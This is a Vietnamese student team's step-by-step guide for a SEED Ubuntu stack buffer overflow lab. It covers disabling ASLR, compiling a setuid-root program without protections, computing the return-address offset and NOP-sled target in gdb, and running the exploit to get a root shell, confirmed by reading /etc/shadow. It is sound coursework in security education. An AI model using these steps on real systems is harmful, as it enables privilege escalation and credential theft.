# Hướng dẫn thực hiện yêu cầu (từng bước, kèm cách tính toán)

**Môn:** Nhập môn An toàn máy tính — HUS
**Nhóm 3:** Lê Văn Cường (23001842), Nguyễn Việt Anh (23001829), Nguyễn Mai Hoàng Anh (23001824)

> Tài liệu này hướng dẫn chạy toàn bộ bài lab trên **máy ảo SEED Ubuntu** (hoặc Ubuntu 32-bit tương đương) để **quay video demo**. Mỗi bước ghi rõ lệnh và cách tính.

---

## 0. Chuẩn bị môi trường

Máy này (nơi phát triển) **chưa có `gcc` và thư viện 32-bit**, nên việc biên dịch và tấn công thực tế cần làm trên **máy ảo SEED Ubuntu**. Nếu dùng Ubuntu thường, cài trước:

```bash
sudo apt update
sudo apt install -y gcc-multilib gdb python3
```

Kiểm tra:

```bash
gcc -m32 -xc -E - </dev/null >/dev/null && echo "32-bit OK"
```

---

## 1. Tắt ASLR

ASLR làm địa chỉ stack đổi mỗi lần chạy → khó tấn công. Tắt để demo:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

(Kiểm tra: `cat /proc/sys/kernel/randomize_va_space` phải ra `0`.)

---

## 2. Biên dịch `stack.c` và gán quyền root

```bash
cd code
gcc -m32 -g -O0 -fno-stack-protector -z execstack -no-pie -o stack stack.c
sudo chown root:root stack
sudo chmod 4755 stack
ls -l stack        # phải thấy '-rwsr-xr-x ... root ...'  (chữ 's' = setuid)
```

Hoặc dùng Makefile:

```bash
make            # biên dịch
make setuid     # gán quyền root
```

> **Lưu ý:** `stack.c` dùng `alloca(buffer_size)` nên buffer cấp phát động trên stack; cần `-fno-stack-protector -z execstack -no-pie`. Trên SEED VM mặc định đủ.

---

## 3. Chạy thử để xem thông số của nhóm

`stack.c` chuẩn **không in kích thước chính xác**, chỉ in khoảng để sinh viên tự tư duy:

```bash
python3 exploit.py        # tạo badfile (điền offset/ret trước, hoặc badfile mẫu)
./stack 23001842
```

Màn hình in ra:

```
[HE THONG] Dang thiet lap khong gian bo nho cho MSSV: 23001842
[HE THONG] Kich thuoc buffer cua ban nam trong khoang [100 - 199] bytes.
[HE THONG] Khoang lech vi tri Stack cua ban nam trong pham vi [0 - 256] bytes.
[HE THONG] Payload doc vao: 512 bytes. Dang thuc thi ham bof()...
```

Kích thước buffer thật = `100 + (MSV % 100)`. Với MSV **23001842**: `100 + 42 = 142` byte (xác nhận bằng gdb bên dưới). Nhóm nên dùng đúng MSV sẽ nộp (ví dụ MSV của Cường: 23001842).

---

## 4. BƯỚC 1 — Xác định *NƠI* đặt return address (dùng gdb)

```bash
gdb -q stack
```

Trong gdb (dừng tại dòng `strcpy`, khi đó `buffer` đã được `alloca` trả về):

```gdb
(gdb) b stack.c:19          # breakpoint tại dòng strcpy(buffer, str)
(gdb) run 23001842          # chạy với MSV của nhóm
(gdb) p $ebp                # frame pointer  -> vd 0xffffc738
(gdb) p buffer              # dia chi buffer -> vd 0xffffc680
(gdb) p/d ($ebp + 4) - (int)buffer   # offset (he 10)
```

### Cách tính offset

`buffer` là **con trỏ** (do `alloca` trả về), nên dùng `buffer` chứ không phải `&buffer`.
Return address nằm tại `$ebp + 4`. Vậy:

```
offset = ($ebp + 4) − buffer
```

Số liệu thật của nhóm (MSV 23001842):

```
offset = (0xffffc738 + 4) − 0xffffc680
       = 0xffffc73c − 0xffffc680
       = 0xbc = 188 (byte)
```

> **offset = 188 là giá trị ỔN ĐỊNH** (khoảng cách trong khung hàm), không đổi giữa các lần chạy. Hãy **chụp màn hình** gdb làm bằng chứng (đã lưu sẵn tại `slides/images/gdb_offset.png`).

---

## 5. BƯỚC 2 — Xác định *GIÁ TRỊ* của return address

Ta muốn CPU nhảy vào **giữa vùng NOP sled**, nên chọn:

```
ret = buffer + δ
```

Số liệu thật: `buffer = 0xffffc680`, chọn δ = `0x150`:

```
ret = 0xffffc680 + 0x150 = 0xffffc7d0
```

> **Quan trọng — khác biệt gdb vs lúc chạy thật:** địa chỉ `buffer` tuyệt đối có thể lệch **vài chục byte** giữa gdb và khi chạy `./stack` trực tiếp (do khác biến môi trường, độ dài `PWD`...). Nhưng **NOP sled rộng hấp thụ sai số**: thực nghiệm quét cho thấy **mọi `ret` trong khoảng `[0xffffc7a0, 0xffffc860]` đều cho root shell**. Ta chọn `0xffffc7d0` (giữa khoảng) cho chắc chắn.

**Chụp màn hình cần có:** gdb in `buffer`, `$ebp` và phép tính offset/ret.

---

## 6. BƯỚC 3 — Chỉnh `exploit.py` và tạo badfile

Mở `code/exploit.py`, sửa đúng 2 dòng:

```python
offset = 188           # = ($ebp+4) - buffer
ret    = 0xffffc7d0    # = buffer + 0x150 (giữa NOP sled)
```

Tạo badfile:

```bash
python3 exploit.py
# [+] Da tao badfile (512 byte) ...
```

Kiểm tra nhanh nội dung (tùy chọn):

```bash
xxd badfile | head        # đầu file là 90 90 90 ..., có 4 byte ret tại offset
```

---

## 7. BƯỚC 4 — Thực hiện tấn công

```bash
./stack 23001842
```

Kết quả thật của nhóm (đã chạy thành công):

```
$ ./stack 23001842
uid=0(root) gid=1000(cuonglv2005) groups=1000(cuonglv2005),...
root
```

- `id` cho **`uid=0(root)`**, `whoami` cho **root** ⇒ chiếm được root shell.
- Đọc được `/etc/shadow` (file chỉ root đọc được) để chứng minh thêm.
- Dòng `...Tấn công thất bại` **không** xuất hiện (luồng đã bị chuyển hướng).

> **Chụp màn hình cần có:** terminal hiển thị root shell (`uid=0`). Ảnh thật đã lưu tại `slides/images/exploit_root.png`.

### Nếu chưa thành công — xử lý
| Hiện tượng | Nguyên nhân thường gặp | Cách xử lý |
|------------|------------------------|------------|
| `Segmentation fault` | ret không trúng NOP sled | Thử `ret` khác trong khoảng hoạt động (quét `ret` quanh `buffer+0x100..0x200`) |
| `...Tấn công thất bại` in ra | ret trỏ sai / little-endian | Kiểm tra `ret` và thứ tự byte |
| shell nhưng `uid` không phải 0 | quên `chmod 4755` / chưa `chown root` | Kiểm tra `ls -l stack` thấy `-rwsr-xr-x root` |
| địa chỉ đổi nhiều mỗi lần | ASLR còn bật | Chạy lại lệnh tắt ASLR ở mục 1 |

> **Mẹo:** vì địa chỉ `buffer` tuyệt đối lệch chút giữa gdb và lúc chạy, nên chọn `ret` ở **giữa** NOP sled (như `0xffffc7d0`) thay vì sát mép. NOP sled càng rộng, tấn công càng ổn định.

---

## 8. Quay video & nộp bài

1. **Quay màn hình** toàn bộ 4 bước trên, có thuyết minh (có thể dùng OBS Studio / SimpleScreenRecorder).
2. Trong video **nêu rõ phần nào dùng AI** và mức độ (xem slide 14 / `giai-thich-kien-thuc.md`).
3. **Upload lên YouTube** ở chế độ **Unlisted** (Không công khai): khi upload → Visibility → *Unlisted*.
4. Nộp theo form trên Classroom: `exploit.py`, file thuyết trình (PDF/PPTX), và **link video**.

---

## 9. Biên dịch slide trên Overleaf

1. Vào overleaf.com → New Project → Upload Project, hoặc tạo project rồi upload thư mục `slides/`.
2. Mở `main.tex`. Menu → **Compiler: pdfLaTeX** (mặc định).
3. Bấm **Recompile**. File dùng phông Latin Modern + `babel` tiếng Việt nên nhẹ, biên dịch được trên bản free.
4. **Ảnh đã có sẵn:** slide đã nhúng `images/gdb_offset.png` và `images/exploit_root.png` (ảnh thật của nhóm). Khi quay video, nhóm chụp thêm ảnh gdb/tấn công của chính mình rồi thay thế nếu muốn.
5. Xuất PPTX (nếu form yêu cầu PowerPoint): tải PDF từ Overleaf, rồi dùng công cụ chuyển PDF→PPTX, hoặc chụp từng slide dán vào PowerPoint. (PDF beamer vẫn là định dạng trình chiếu hợp lệ.)

---

## 10. Checklist nộp bài
- [ ] `exploit.py` đã điền offset/ret thật, tạo được root shell.
- [ ] File thuyết trình (PDF/PPTX) có: phân công, các bước + sơ đồ, ảnh gdb, cách tính offset & ret.
- [ ] Video YouTube **Unlisted**, có thuyết minh + khai báo AI.
- [ ] Đã nêu rõ mức độ dùng AI trong cả video và tài liệu.
